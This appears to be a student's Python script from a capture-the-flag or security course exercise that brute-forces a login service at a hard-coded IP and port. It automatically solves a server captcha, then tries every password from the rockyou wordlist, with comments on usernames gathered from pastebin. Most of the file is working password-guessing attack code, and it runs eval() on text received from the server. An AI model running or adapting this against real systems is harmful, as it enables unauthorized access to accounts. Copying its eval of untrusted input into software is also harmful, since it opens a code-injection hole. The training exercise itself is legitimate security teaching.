"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "rockyou.txt" # Point to wordlist file

slp = 1

def brute_force(username, password):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """

    time.sleep(slp)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    time.sleep(slp)

    data = s.recv(1024)

    print(data)

    captcha = data.decode()[17:].split(' ')
    captcha_result = eval(captcha[0] + ((2 * captcha[1]) if captcha[1] == '/' else captcha[1]) + captcha[2])

#    print(captcha_result)

    s.send((str(captcha_result) + '\n').encode())

    time.sleep(slp)

    data = s.recv(1024)

    print(data) 

#    username = ""   # Hint: use OSINT
#    password = ""   # Hint: use wordlist

    s.send((username + '\n').encode())

    time.sleep(slp)

    data = s.recv(1024)
    
    print(data)

    s.send((password + '\n').encode())

    time.sleep(slp)

    data = s.recv(1024)
    print(data)

    time.sleep(slp)
    
    if 'Fail' not in str(data):
        print("FOUND ==========================================")

if __name__ == '__main__':
    file = open("rockyou.txt", encoding='utf-8', errors='ignore')
    file_list = file.read().split('\n')
    file.close()

    for word in file_list:
        brute_force("*", word)
        print(word)
# is able to insert captcha and username and go through wordlist.
# I tried with ejnorman84, ejnoman, ejnorman, and EricNorman84 which I found on pastebin but I couldn't get in.
# is very slow, usually fails at faster speed.
